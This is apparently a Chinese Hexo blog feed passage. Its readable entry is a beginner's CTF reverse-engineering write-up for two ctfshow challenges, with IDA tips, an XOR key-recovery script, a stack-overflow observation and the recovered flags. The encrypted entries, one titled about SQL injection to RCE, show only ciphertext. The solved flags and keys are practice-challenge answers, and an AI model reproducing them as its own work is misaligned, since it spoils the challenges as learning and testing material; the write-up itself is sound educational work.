b5156dcf5ecd0aed073386d79a206a69827770d11661aae020a9822d4dcc0b8c3d8f5c89bf7e4276749c71d8a886fa7dba33164816cce0fedb5f4313c1f0dc1006d7edcc6d978e04849a1d703d5987867f65c897f4601a992772cffbb0289f0b4ee9251ba91a637b937f89c65325ab448776a607f3ff0b2464206fbc35a58260abea8a3d5692a346a410eb5f1dba2ae292687273d8b98a0a5db34061b7d40af665d856b8b3d1d38084be4267db45cc814fc4daac669c5bbd88ea16076bf9a2834d9a632b96a74156325ad21dda4a0c77edf289ea86d57003686bc4cf9f045b91e8defe05ac2dcff59af0aa34d2ce6b425b873869b0e35b683d0965e45e65b79676e0b7d218ba3603aa78679b769b88b0fdda66c4915191b45c3232423e19957aa9941cea3f56843f42b84cf7e15ab3ba5c0fe9f4331c9e5c1b58b7baf0123aed1961ddd911da6e929c6cfb2268490f6bece5aeb75e36f7379fb4fc38e16b04ddcfa0612d51688cfe33ee8f4486eade30818a3741b1950f2f45ea149b1b4cc670746c1d3086e751012bb8a5c87ca44c73ff5541f1733cc655363732cd9ef76141d0dcb62ad8dc0c86b3f699b29d2ea2b66ccd7fc5bd734e2fb6d5004302c4584ef7244f0f2cfcc3fc57d6f4a444410a306b476ca6a1c2952a8934a67547e23c59405ba29facf52335154bcd267b0b13a23d202c1af9dc9d457b56fa02449a16b5d21b58dcd054f67abf8eb22e22fae36d9ed1a6772198400faef28e61b4e14f8761041f718582e90b52d366fe948a04d48bce4ff6c91f881c966554d3d27e85729fcac4971cf85f933ccd334f9b256a60930619a50a29150e1d5a9030c4155588ffb68cec09bcad6ecac9a9d25401f32a4454924c67ec0c738cefad0a88f44fdab385d096a6ec19e34b28b98d8465e6e62a1acd21e6e3a39419981b5b3324ccf361da64a9ca7b78764dc2a5acca7ea06f636aeab8ad4a8532e762206fb5fd36702ef4d179ec9e78ebe17425ce59a0125a52406d1ef4bcee9cadf14aa982cc2bffee2a0e8de6b6bcfab75d71e08001bd62a693e095e4bb2d580c46aa53d86a067f535024994fefab3338322fece1e72e336150f687571fbc39bd1dc3e491f0262378f02b5a324ab86669e6eba0002ec3920ffb679be901c3d8c285a89a12b86c0a8890bcb94fd83c2866f068be5d9c1e4ca36f60cabdbfe8d6d84340a5eb48ef7c4a88b641ff4d82fcba68f684ff22f12cad63d931d8fd1949b8fd01e31efdce37fc1c78688ce54cb271a0c2ed742bdd3d1a33891a6fbb97ee813e1e9545e89aa61fc9e2b7c1dcb2a08f144d8f433a442add00b7fe441617a7a9c0a1a855b6308f8d7d52bb2f8795f59a73d17c627b1a7a2da739513bf774709c626b9de2d6ca43a959f2eadfef998e3ec4d0bd270e8b6775c977f0b99868a55e70b0faa7ef2da6882169aa4f072103090fc40b1af7e245dec19c21ded0d08f41b8c316a7425f7ce77e930f370c48603d5b3b5245c6b4b485da9f2dc962ab7f3b77ce73c3a6341aa6b24799b393e8b11ee393f8b4a968cbfb3d8b54a061bd087fe35673637c373ef7106fe4ba599d470f48720e5b295135b2a0ce3d087a299c8538514a7de07696140bc84a0fb47a794eebaf544b8734c9848f19cf9796ea509eba7d34657c7fd635da065929d20f16d434721e791e0a2ef83f5d8d23da5ca1d2cb398b08fc6451857f085af87a4ea2c1c6691433797f5958488aa0f3b7a840d480bc33f5127bec4c938df87ff5e7a51cd81a57cee0626af28f839c5e1cdbe34f4fe9315728fed8a598464d8a7969784f0f9b80e1d557f2eb6ab4855362bd74997486a39a0f260f57202709d1768208329f79324c6bc101fa82c12a15ddc05c0b00aa12078bdbf239d908e6725f5e952c2586a2a2d39605c4ca19668711cbf2da7df22a5a3600f2c1c83ac45e715f961175bcc90d9bb596c1c3095db9d4bd88f5924c51d1db34121006c2e96cf377862e8e027b9eb9e62a8ef5980e557afc39e7f74a130545c895b95bc92baf7ed5f4736877f7ae1282c1e4fb1bfd9d3ac19c5061f403d8c2000b690bd70b65faa01da6101838f153c2b671215cdabe2775b123f864a94afe76219dcd557d1b3915ece7b13112a04795c961453b75a08bdda262cca62bd2ece31ebd7bafb3de8d8561c2edfca9c716bb3bb959ed518a3fd9a69c14c5317731b1aa7820df89bdad113711a73ccef416b1e0a53e1619c05c947682763be41c8c88c2f998a353fb8121c304dd3b87ccc7e692bc7af6036c822c28a2396f606034e0c100c2f313b4d7d413f105e7710984caceff414925fa7c7b6b721d02e8bf9d413e16391882e4b6beb70b209cfb5c4964d502c56436332853b5ccf2d6f025091870596d01a43970a1a76bea9cd0244212177a3988761900407ba769b05ba96d8db286c2e7a5b4e81b320913a33d532400281a39be7406f53ebc76305838275699b3193bba02ee6f969de9388bd469024fc7f482c51f93fe6da089e05861ad4d246fa3f72c36bc63f42913212e7c8e26545ba8740261ed1c096b819bcfe917c115464e5eb6dfb26ff129210cd35a1943a546b927523501fb4fa4867520e93d0a46b42b0a4d83f1a6fe2f5b3ad1ced589d6506a1acda6c93ee4933728665e9fcf2e3a82e2f2584d152f09305698dfbfb128846c88bb194b831dd353bdf2d2dc99ac6a19ad90c1eaf13470c7e09126a6ed1d23a865adfdcbf2cc5a66c2df3ed5acd42a335f76957209022a31c4e275eb5e0731f9eed18b3f82b99c421a1ba2f080d4a126f8b1007012fb26b4b1b3c4b2ecb1092eaed1a0cbc3927ef8098289928d255b296fbf656cd59091d88b2ac255e98755895617e085b1a5a121f046266b99ebfe069198d5373387a68c2baebe85de3c5e35030ba6bf3489c8c4d335a211367e29fc1efb608164d6d3310b60ac86df23bf97e3538259748a7e828f145421bf000ad2d475432737b3936cc144c9096ed529437c285ad0912b535378a3531004ac1f9cba5a66e9da243f1a8c8dda300bc214eada2dbab2a11de9884070f5506b17eb238c3bceb07f41c6d22c852bf487c41eef7ddc7df10f35ee973652b6379b82777ae1bb50f000959007a9b68c8a1f50b9eecf01f58214d7de03b67bd66f77d289b9115d83b98c899ebb0a38f21fd9a753f2054889e238fbf927881e349da12d8bed626d57cc3cc6c84a36abcdb8256be85fd0c31f58455eafcba9974b4da4402c9b5a40a40d0ff4c56ec1d35f37efaf2a63cd6e9dbbf2a38fb7c33ad716db109be34f664c1bd49b18eebccc63c995917674bfc8f57e8f7375d843ff0d80a7ab555cbaeeb194089198fe647b4afca69e972974ee0885a0e3c72834b650fa3bd650de10f6b4b99e16a1ce429fb27998543555c075b36c1a9ffc9456b98a56f839385d24deeb960d3cd69346312ded16d25b79867629f989f79aa23fdf7274bc95ff5c48fd1ed5cf64e9e4341c26a84039052f179ea490aa6ab44a258fff6dd401688aa4f8f6a231564dc6d4eb811f9ad5be09c1d5ff11183aa283409d09812b82e5f064dab2fe13ef435d573070817cddf6379cf1237c6371c477df978fbbd00e20b7631e3310bf31a0c330adad44eebb3de35f70d0879e3e1c44ccf05884e205c63aa903d2571e30e987a2a41baadedc4cd43b2bef196fff839d0e680de0ea8011b340b13e6c332ea89adc948532e364b3ee3e94a8899fcbb5bc6adfab44732f8ad1ce67d8da343a19f246854c32b2a271bf26d5918d6928774d5257428e36c245b15ab957830f0414f4414c1e9d02c4f54a1779541d62632f5d4cd55ddae8cfbd830afec670709305136027248732891c773b0447a93a746b75210db991ca1172cb5285885e9ea2719fcf9e3b1f484cd1cfacbe5c93b0dbed8041c9260795a98032285b2a4c67253656dafbf1c5b2cdd25691d407e35c8602362d976e46a64d611aa40b756b2979d11feca299ead223439db9d74fdb282c1265daef4bc422b2e00d5671830aae3501fa427c0db6a2d944288c34f3f26fb0a80ebeed219fb68149ef2e0ca620dec4c343cf38c551d6e2b0b4d5340542c347289456940d6355a13b1811078b0f7d07c4aa53b6168545094d06338ba6d30dc80189fbea44168c8d4f8bda3805a3e6ca00461425a5f51fb3aada0d18a05eb0c146eda2f134f0ddcddb15b9a1c1c5c84b78d6f4793f97bc2658453e6f25fd04ef3a316cac52314decee54ec39e61bc815b82e65ff6675c853d468a0891cbe5a6abe355cf0d6aebd0eba03e46fd02a7c3035426780952e94e2cb589ccacb7496d7317d1b676dafc84e6b8afee1ad85fe0b13bc254c3cd7af0ad2801b24ad5a9e1f82dd8ad3aa17d8531e0be5a8b1b0991613933d99db1a479fcce8ee0316ae8632a955017b6dc3749593fd37d5ab4e3ca4e3d4cc57f5057861cfd9d70061665a1f2c07468c3066c7973680cd2713277ca353b232ec2b87fecead8095572cef9435a9522fdc6c6a569e2ffef013ed2b30b2c20e1d125ac4b11a56f11823047a17a7bc3c492d3ee226750ac490fa671db503096eb1be1665b92814a528d02dd588861dd99252fc0ce1e00e185a2de59cd4a3d5d131a70f1eea5b531135599f012bc14ae3ff73a70f0545afcbf0b3772f2592ddc9812830680a62002e653c0fb14890c792bb62d8e238ddffe740d796e66374e1e7db21a9afa8f4268cd9eb878b52774483e8c5a8ace85e2288d5d75d13c6b351153de9517b6be4d52187e40f4bae154b86e73b6beba95907003f93a0bc7faca38f7b253a2caba404d08f5e7f42b7feb8ea0a978b43e8fe2fd39bac0e46aa940d4e18cc76f738bded305973785e0c13869fe402357d52f52ebd900501848d3150c8b567cdd4503424ea08f0379d71f1187d94b4628df76609c7a8c7a8a77661af2a8b9ab23f42aeeec4f3fed8961b3d2809e7ba237b606fad442f337367ec2cfbdd781aea54fed45c20f538154288dddfcdb7d865356b000b184f7ec15ff9aae4a745549af8d3f2302837f36b1f46db1783d817245d73dfa37498021cd78ec2e85adfc34af4bc3fc2687e7ae768a91f6b235b79fb84204cb6e98f909f2db88cbb6e44f8e3a118a03eb2347179b4a7fd2838a8c8973cecf28ef403e783c559569b541f1dc15cf15049c1cb0634ad1ff64506831c0f4a6b186855a5d1fa3ab56d1ea0fbaf195e9b931cbe4daab281ed89a8ac62e0c80cc9ea85d832366975c75c2b40a2a3aa621d3aaab02fec15952de8329022bb0220ff8e5091d0a1be3544870355e170936c7c1a0ad3cf6944b42abec19dcee0376c2c33e4da5c97f8e210d787e7d1d938f935761713f82705b5fae84691a3f76d38be586654bc35c21ddc0ec0789e8dc895c1c79bdeb966be6bc58cadd4895acb9dfc550115f03f52f6a575014bc3789a093caa1a93c237494ec8dc62130ad3e586c07dd9507ea919d7c45fa597668e9530ea2510317e7401592fc5e86414456250cfbea8eb20c4eb9c1141323ec41cdf454da38871a86c0eca668fb0fdacbbfb119247490cd833652eb69f1b718920987c896fb6f24a91a3ad92f2f45e103dd370d3fb9ada85b231716ab47807cb2f76fa1b1a89e65c78c8ff2d90e94e37a4a7b1ef9339a668803a5034e6da9e107cedfbf6d7c66be7b1a99cf9f6bfc2814170995334b95cd85dad6d78f37dfea0de4f3a31c7245651483a08e6e11aad2e602901695d09495c16e1a4dc41ad135947b5add28228b49d3ec5047cd98caba757f361e39fe3437b9a125ab4a20514bdfb555545283c6c4a884cabc9f6782f9a06eab4f7c57ea49bb2a7fa11c62587609b48a5ce6cb4a0f7030b034d03b827deb9a42762206abf8878afd3b8132de6cf4fdee631c0c93b2a4129ff295919f60c714d73e158779f492e443c1e218701f12b68d43d47cf245993cd4f985911e04d968a1c59b6a49e0e1d939844907ac6f30f79021799e5d1d09bf8cf69016e86e4c9b21a40f558e6d3fecbe4f3730b2c83454b21356b158cbe89f65256e1a6a112663b9ebf202c7577fabe1c5d4eaf378eb0ec92bda440c41d2d8ff67cc31c214cfdefedf38f4a6bf7f2a8537d60427135361fb1e320bf9acb761c50d7ef9e47cccace22827ba819d713d984436eebe905b6326a4106d7608e3520e391a103bfedc965e6e61d7a42ba2008d0edb7889550356632ca51cf71f8dfa235cd29e6b4fa5edc0e1a81c1047f3c36b50c3f285c6dc8a304f70d9fdd8c93a1604f4699d8da61a42106589f3eeaf7382b908a337ea0d1d3aa26a5ee7f81f8d6c6729f0dc90c7fe14e534be8a35efb298434d24a8c26ff323f7ac4bbb8bf3865f437645e4bbf6af0381410afdcf50cf379fe564663e4d69253d03ea0ec570c334ca6e54d0a261d4d8b16dbb2018c9add1a960e1d7047c5bf1913bb5da215b0dd730027e7d8006054336b919f236f711d6d42cbb61833b263719a341ebb7f6aa80b98c5d128b1608a6c1c15f2e612f829a8a612c82a08c35894df6e711779da66063844557e65298187938e05d2f93eac01cdc230e64744881be666ce37fa6d75bb00e95e4fd10f15ef1771809a335cc331fdf36ccdae4c8fbe46529e3879d0f9f6d1230608a29d991df4a49f851ee62528eb9664baa1f01b293e1f192ea941f8f29d1b8ddcca4d00cfb54ee04efa9c4ecccc4a86bd089c29cd7c1e8546bdd9d6ca229ef094782520d31f20282a7067451d965ed28fb4054f4b111664150a8486537c8e13ae5e5ad55cec75dd284e602882383c017bd2b2faa2d92fd917c800375d3ecce46b8042a5b23313b0f362700dacbb8fdac009b0af815105c9322df1e9e97ee12edbdd3da4be653df2d1e6150f7b87518a5c2981f4eaf5dae26d0e9f6c2a65718456d7cdbce3a5a5f691a510f047a39b4f148410ae8f69f7f8d9f99f01753465620e3bd7bf3e3d6b7aa96e7c99786c4edfb91f22f1ff4b0f63a44aac8a9f799e841d8e83001ce81f0873078940d5d397d15e013c0a7bd95237178913f48c1ff8279da06738c6d57270309d221d8055efa37ef13deffc4341c9ff40ec35f3c8eb94f17c8eb53756e25e49e846ca0285d24bec0a6f216b786756635402210e1faa7defa6fc15568c7be00c3b29ff8f54316f401d5290ea18908812e62639b17040d8f1d5fc07fb3762b32cb1ce885e79c3db85268a5408b112a35e9efa5802fc195fa2f25f32cda80edd19e567516ad356c19c63612256c527561ad568a7f21044b4db14b1f8e1bf9b65fe07df029d274446883bc2ae1a4b51b36e7614eb7bac76310b7e86a50332a479e41a3cdfb16119e1e26fec11216d63dd0469f6debcf195908fe0ce47b65ab081e787a38368d326d8ee1314e45f19a08ce3b6d4bde3fb4acaa41b13e91b7b4dde28ff1913d238d3d359757bd77fb83df2cf998b3f26dbcafcfc1a2a2bb468500939ac4de271f141bcdfd08573b07500ba862d18415060c0b7b0fc7961d3db3e1c1ab7bf56019b0863c24ee696dae0e4e2a694f69b3898f821f0ba9d5cd491dd5451e1ca01484d672c1e878c218ad46a6c6406bb36fafed5e1d54a4c0d5505f4a5684b5fecbb118bc793956af8e1766487fd35136b3bd4d9e946d5bf586aa89c415066e1416cad5703da0d42dff3a34d2b6f9c504642a868eaa9379cb8086cfddb718b3790dba900275e93f041f3df070a2357a43cfe74a38703ad0eb39e92e87c9a7071d8ac37229fb40918ddb799b88df638e84af45a93d73b329089d395b808dca323255eef4803d18166abcce93237b54f893ffff1566d2918a5e6e2301f0d51af25b675ba5663c866bdd204bc7da8eccde69b3df7af236ee34a2c2c41821b96f2dae1e53c2616203e81d3bbbc26acb2efe9b5023ad8812012462c1391551f55cfc964ad36882067ce6c19674d1c9dcf0408c1c440e8d528266faec16129d702ef69ce2f3fe94fbd58f712ccc700059452ffe52d3a2b17e56323c3f09e71e89ebf65c0217b965d801b8957c06f63f4c02ba0920514ede699c0f506cdbc71adf790d6cda6997008a1404956cc094c984c7a6fa8b12267080bcc20204d1c8a088e63440dd12e2d139f2b12353d63299a33eb118dc07c2e1efd3dbbae11e802fe9592b634c305e2f1fe79e958b803652b5b3d2e4bc688059a95e0b8bba2ab68ea4594c71506b058ff39234373ed98b2b4f57cde088a3a98040a295f89877c373c429fe03572c2755e92ea8aeda87f41353bf35d1438e17f13ed689ac3410459ca907b01216190045219bd0fb90c64816a645153d0f5a701c4ec57d753d5a5467654a77fd936b84054b114d58e94aa45fa0bc69df022a060145bbfef3073b3b04f9b5df5768d3f8e5e3c26d100d6aff6fc248e8220837eaa1f987e749e505480b981e63025e447e451e5f5c35a5ea7bc0637fb48c07374882266f9b1d1ea3d4d3a5ab7150ecdb46c59463703683c3710f9d9f3de823dd8580ca21dd8ef477078a65d681888e1ca1ab2e672258a35964d0cbb59f26b331ed9416270cd4c82e5e07265a0a0a65b0fe001f0428484bf5df4581ee9360af86402dcc91902640f3ad1dff30c240b1601b81a562ccc4e3c21c3eb0490f8eef0a13fe7f15a4842c8244aae8674d4882c0d8d3579d4ba04a76ee0fe24c3efcebb5eac06fd98284ffe190ac4a2e3e9a3628341f97faac28e7c07338f943d2daa9e7474f81e27b96cf8235a04be8e93c5e044a0a746e5eeabf9b6ea1a092b38d1e544067c4100b1db7eacc39e86077c912752c93ddacb7251422952e14f54ca0c19e0e7079a07c5ecbf32dc42426d7c429155fb2409a7c54b90bf3dd0b028974c83ff4414abea9fffe91071b89fd6476066a84e0a34838a293db5de75e379a541baf52f99a0313c353a5a0e0751f1bfab9feae3886cbf473e8bb5e26c0b5120a5dd2820d94af4682c098d65a30a08f32cb469ff29b70d9cbe5132bfdbd4e229bafbd7ded3cd019172bc21e7591525b28f9b24b31c2b1012853b9a46a3bbbeaf085c451b448394c157d44e998e16c9e57333a66d04ed1a6907abe05080171458d7e6e8ea3c4f8bbefd1e618dedf077a5e9206c14ca303538303320082134053b786861a763bc18ef414648c55dcc9ca637930364df429d9bb01a2e96ab76a0df122505c0c30069d4cd1fc917f7364b08a2a3d6ad4c1d0fbeb67f154d9834f9c2df7e9f1ae43b7e056f84b4f4b12fa62db71ff3beeac2bc7029097ea361baaa2aa8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>实习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>与Re的初次邂逅</title>
    <link href="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/"/>
    <url>/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/</url>
    
    <content type="html"><![CDATA[<h2 id="与Re的初次邂逅😱"><a href="#与Re的初次邂逅😱" class="headerlink" title="与Re的初次邂逅😱"></a>与Re的初次邂逅😱</h2><span id="more"></span><h3 id="记录一些IDA的操作"><a href="#记录一些IDA的操作" class="headerlink" title="记录一些IDA的操作"></a>记录一些IDA的操作</h3><p>因为第一次做逆向题，所以IDA也不怎么会用😭，所以浅浅记录下</p><ul><li>IDA有两个版本：一个是打开32位程序的，一个是打开64位程序的，一定要用对，否则不能查看反汇编的代码</li><li>快捷键：<code>shift+F12</code>打开字符串预览，<code>F5</code>打开反汇编代码，<code>n</code>重命名函数或者变量，<code>/</code>是对该行添加注释</li></ul><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/1.jpg" class=""><h3 id="ctfshow-re2"><a href="#ctfshow-re2" class="headerlink" title="ctfshow-re2"></a>ctfshow-re2</h3><p>是个32位的程序，用IDA打开，首先打开<code>strings</code>快速检索信息：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-28-39.png" class=""><p>检索到一个敏感字符串，以及两个文件名，一个<code>enflag.txt</code>已经提供</p><p>连续定位到读取文件的位置，找到主函数：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-33-49.png" class=""><p>查看其反汇编代码：</p><p>这里出现了一点小问题，在查看返回编代码时出现栈顶指针地址为负的情况，导致反汇编失败，通俗来说就是IDA不能识别主函数的大括号具体在哪</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-45-50.png" class=""><p>解决办法：打开<code>Options/general</code>，勾选<code>Stack pointer</code>，用于显示栈顶指针的位置</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-47-21.png" class=""><p>这个时候可以看到地址了，然后修改最后一个地址为正数的地址</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-50-29.png" class=""><p>我这里修改为<code>-0x440</code>，将最后一个位置<code>retn</code>那里设为栈顶指针</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-52-25.png" class=""><p>然后我们就可以看出反汇编的代码了：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-53-56.png" class=""><p>分析程序：先把一些明显的函数和变量改成易读的名字</p><p>分析的过程中发现了这样一个函数：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-03-25.png" class=""><p>点击进去后：发现了我们熟悉的字符串，说明这个函数是校验逻辑，将输入的<code>Key(Str)</code>做了一个异或赋值给了内置的字符串<code>Str1</code>，然后判断<code>Str1</code>的值是否等于<code>DH~mqqvqxB^||zll@Jq~jkwpmvez{</code>，由此我们可以爆破出<code>Key</code>的值</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-04-42.png" class=""><p>写脚本出<code>Key</code>值：<code>[Warnning]Access_Unauthorized</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">"DH~mqqvqxB^||zll@Jq~jkwpmvez{"</span><br>Key = <span class="hljs-string">""</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">29</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-keyword">if</span> j^<span class="hljs-number">0x1F</span>==<span class="hljs-built_in">ord</span>(s[i]):<br>            Key+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(Key)<br></code></pre></td></tr></table></figure><p>之后下面那个函数点进去发现就是加密函数，看不懂😭😭😭，再看看其他的</p><p>这时候发现，为什么读入的是<code>flag.txt</code>，而给我的是<code>enflag.txt</code>，这应该是答案输出的文本，那么合理推测，<code>enflag.txt</code>里应该就是被加密的文本，所以我们改一下名称，然后运行程序，输入<code>Key</code>，然后输出答案？🐸</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-28-12.png" class=""><p>答案是的！蒙对了🐸，<code>flag</code>输出在了程序新建的<code>enflag.txt</code>里：<code>flag{RC4&amp;-&gt;ENc0d3F1le}</code></p><h3 id="ctfshow-re3"><a href="#ctfshow-re3" class="headerlink" title="ctfshow-re3"></a>ctfshow-re3</h3><p>是个64位的程序，用IDA打开，然后反汇编，得到如下结果</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_10-38-18.png" class=""><p>首先拿到题目，一步一步来看，到<code>strncpy</code>这个位置，发现是将<code>v19</code>的前<code>n</code>个字符复制到<code>dest</code>里 ，然后发现<code>v19</code>根本没有被赋值😂，那<code>copy</code>了个啥呢</p><p>我们发现，<code>s[5]</code>和<code>v19</code>是连续定义的</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-10-36.png" class=""><p>查看变量的栈：直接点击变量进去，发现两个变量在<code>main</code>的栈中确实是连续的，那么猜测存在溢出</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-18-09.png" class=""><p>点击<code>read_input</code>进去，</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-17-01.png" class=""><p>发现确实使用了<code>scan</code>而且没有指定读入长度，那么确实存在溢出，输入的内容前五个字符存在<code>s</code>，其他的都溢出到了<code>v19</code>变量中</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-18-32.png" class=""><p>这下解决了<code>v19</code>的问题，</p><p>然后再往下看，读入内容进入变量<code>v5</code>，最后赋值给了<code>array[6]</code>，然后进入循环，将<code>array</code>中的内容一次加到变量<code>a</code>中，最后会加上我们的输入，所以答案就是用<code>0xFFFF</code>减去<code>a</code>最后的值，因为这里我们设置<code>v5</code>的值为0</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-27-07.png" class=""><p>所以答案就是<code>hex(65525-58720)</code>，为<code>1A9F</code>，这里填答案，出题者设置的是小写字母</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-31-48.png" class=""><p>贴上通关逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    <span class="hljs-type">int</span> array[<span class="hljs-number">8</span>]={<span class="hljs-number">80</span>,<span class="hljs-number">64227</span>,<span class="hljs-number">226312059</span>,<span class="hljs-number">-1540056586</span>,<span class="hljs-number">20496</span>,<span class="hljs-number">3833</span>,<span class="hljs-number">6815</span>};<br>    <span class="hljs-type">unsigned</span> __int64 a=<span class="hljs-number">0LL</span>;<br>    <span class="hljs-type">int</span> v15=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> v14;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>    {<br>        <span class="hljs-keyword">for</span> ( a += (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)array[i]; a &gt; <span class="hljs-number">0xFFFF</span>; a = v15 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int16)a )<span class="hljs-comment">// a&gt;65535</span><br>        {<br>            v14 = (<span class="hljs-type">unsigned</span> __int16)a;<br>            v15 = a &gt;&gt; <span class="hljs-number">16</span>;<br>        }<br>  }<br>  <span class="hljs-keyword">if</span> ( a == <span class="hljs-number">0xFFFF</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"OK"</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次由SQL注入到RCE</title>
    <link href="/2023/09/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%B1SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/"/>
    <url>/2023/09/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%B1SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4cf79468aee65d1d3484142521125bdb887e369c3713b90307a19d9d54c5eaf0">80f7af2430a3dce6996ee26d1569b2387a6760317617560872a68462e465e4d413d523fb4afe4b67538fa5bb9609e975286afceb1dc8ba08d66372adddf35367420e2eeeee08d574b9f10cfaf8e7822a0898013877cf30fe9229ee77e1b99604036d4b446a73432b393cd2025843259db29eb80b586978520ff4258f18c353235e5e5c1beef596a768eddc72936094464786dca0a86dc3c3c031ec90d227e8fb1f2be0bc498174707451610c8e0284a3b0f50f3f9142052bb84ebb2c5affb9d10d1af88650d32d348971573775226997b15be78e96fe12d110dc5437f622a13291b618f94a2ebf6b206697bdebfeec073af5731647875e13dacc397ceb4888b75a2f125a76ed35f69780b43e7922d9a03e3678737da64fdd2218f608c6888699cc3fb8ba3240f954c0afd321ce69c77c876471abfe13986f9d3d2480a0a8aece66a3e07f74e48c8456eea8be0273b95b57eb528960d180b152ba835b645000c8d27d190282384ca3a0b59e30b7826ff